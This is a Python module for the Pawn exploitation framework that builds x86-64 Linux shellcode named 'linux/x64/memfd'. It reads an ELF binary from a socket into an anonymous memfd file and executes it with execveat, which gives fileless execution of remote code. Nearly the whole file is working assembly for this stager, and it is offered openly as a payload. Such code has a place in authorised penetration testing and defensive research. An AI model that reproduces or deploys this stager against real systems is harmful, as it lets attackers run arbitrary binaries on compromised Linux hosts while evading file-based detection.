"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from typing import Optional
from textwrap import dedent

from pex.assembler import Assembler
from pex.socket import Socket

from pawn.lib.module import Module


class PawnModule(Module, Socket, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/x64/memfd",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
                'Tomas Globis (Tomasglgg) - payload developer'
            ],
            'Architecture': "x64",
            'Platform': "linux",
            'SendSize': True
        })

    def run(self, length: Optional[int] = None, reliable: bool = True) -> bytes:
        payload = dedent(f"""\
            start:
        """)

        if length:
            payload += dedent(f"""\
                    /* Push hardcoded ELF length if provided */

                    push {hex(length)}
            """)

        else:
            payload += dedent(f"""\
                    /*
                     * Read ELF length from socket
                     * read(rdi, rsi, 8)
                     */

                    push 0x8
                    pop rdx
                    push 0x0
                    lea rsi, [rsp]
                    xor rax, rax
                    syscall
            """)

        payload += dedent("""\
                /* Save length to r12 and socket descriptor to r13 */

                pop r12
                push rdi
                pop r13

                /*
                 * Create file descriptor for ELF file
                 * memfd_create("", 0)
                 */

                xor rax, rax
                push rax
                push rsp
                sub rsp, 8
                mov rdi, rsp
                push 0x13f
                pop rax
                xor rsi, rsi
                syscall

                /* Save file descriptor to r14 */

                push rax
                pop r14

                /*
                 * Allocate memory space for ELF file
                 * mmap(NULL, r12, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
                 */

                push 0x9
                pop rax
                xor rdi, rdi
                push r12
                pop rsi
                push 0x7
                pop rdx
                xor r9, r9
                push 0x22
                pop r10
                syscall

                /* Save address to the allocated memory space to r15 */

                push rax
                pop r15
        """)

        if reliable:
            payload += dedent(f"""\
                    test rax, rax
                    js fail
            """)

        payload += dedent(f"""\
                /*
                 * Read ELF file from socket
                 * recvfrom(r13, r15, r12, MSG_WAITALL, NULL, 0);
                 */

                push 0x2d
                pop rax
                push r13
                pop rdi
                push r15
                pop rsi
                push r12
                pop rdx
                push 0x100
                pop r10
                syscall

                /*
                 * Write read ELF file data to the file descriptor
                 * write(r14, r15, r12)
                 */

                push 0x1
                pop rax
                push r14
                pop rdi
                push r12
                pop rdx
                syscall

                push 0x142
                pop rax
                push r14
                pop rdi
                push rsp
                sub rsp, 8
                mov rsi, rsp
                xor r10, r10
                xor rdx, rdx
                push 0x1000
                pop r8
                syscall
        """)

        if reliable:
            payload += dedent("""\
                fail:
                    /*
                     * Exit in case of failure
                     * exit(0)
                     */

                    push 0x3c
                    pop rax
                    xor rdi, rdi
                    syscall
            """)

        return self.assemble(
            self.details['Architecture'], payload)
